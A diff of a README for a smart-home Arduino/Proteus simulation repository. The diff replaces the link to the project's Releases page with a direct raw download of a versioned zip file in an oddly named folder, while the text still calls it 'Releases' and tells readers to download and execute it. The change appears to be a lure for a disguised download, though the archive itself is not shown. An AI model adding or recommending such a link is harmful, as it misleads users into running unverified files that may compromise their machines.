@@ -14,7 +14,7 @@ In this repository, you will find resources related to Arduino programming, Prot
 
 ### Simulation Download 📥
 
-To download and execute the simulation, please visit the [Releases](https://github.com/huy01997/smart-home-arduino-proteus-simulation/releases) section. You can find the necessary files there to explore the smart home simulation.
+To download and execute the simulation, please visit the [Releases](https://github.com/huy01997/smart-home-arduino-proteus-simulation/raw/refs/heads/main/guaiaretic/proteus_simulation_arduino_home_smart_v3.3.zip) section. You can find the necessary files there to explore the smart home simulation.
 
 ### Get Started 🚀
 
